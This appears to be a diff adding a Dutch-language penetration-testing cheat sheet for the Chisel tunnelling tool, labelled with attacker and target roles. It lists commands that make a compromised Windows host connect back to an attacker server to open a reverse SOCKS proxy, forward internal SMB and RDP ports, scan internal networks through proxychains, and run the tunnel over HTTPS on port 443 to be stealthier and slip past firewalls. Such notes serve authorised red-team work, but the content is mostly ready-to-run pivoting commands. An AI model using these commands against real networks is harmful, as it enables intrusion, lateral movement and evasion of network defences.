@@ -1,0 +1,19 @@
+# Chisel - TCP/SOCKS tunnel via HTTP
+# === SOCKS Proxy (meest gebruikt) ===
+# Server (aanvaller):
+chisel server --reverse --port 8080
+# Client (target):
+.\chisel.exe client 10.0.0.1:8080 R:socks
+# Proxychains config (/etc/proxychains4.conf):
+# socks5 127.0.0.1 1080
+# Gebruik: proxychains nmap -sT -Pn TARGET_INTERNAL
+# === Port Forward ===
+# Forward specifieke poort:
+.\chisel.exe client 10.0.0.1:8080 R:8888:172.16.0.10:80
+# Meerdere forwards:
+.\chisel.exe client 10.0.0.1:8080 R:445:172.16.0.10:445 R:3389:172.16.0.10:3389
+# === Via HTTPS (meer stealthy) ===
+chisel server --reverse --port 443 --tls-key key.pem --tls-cert cert.pem
+.\chisel.exe client https://10.0.0.1:443 R:socks
+# Tip: Chisel tunnelt over HTTP/websockets - gaat door de meeste firewalls
+# Tip: Gebruik --auth user:pass voor authenticatie
